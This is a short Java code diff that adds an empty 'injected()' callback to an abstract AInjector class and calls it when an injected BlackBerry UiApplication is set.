@@ -45,11 +45,15 @@ public abstract class AInjector {
         tries = 0;
     }
 
+    public void injected(){
+        
+    }
     public void setInjectedApp(UiApplication app) {
         //#ifdef DEBUG
         debug.trace("setInjectedApp: INJECTED");
         //#endif
         this.injectedApp = app;
+        injected();
     }
 
     public UiApplication getInjectedApp() {
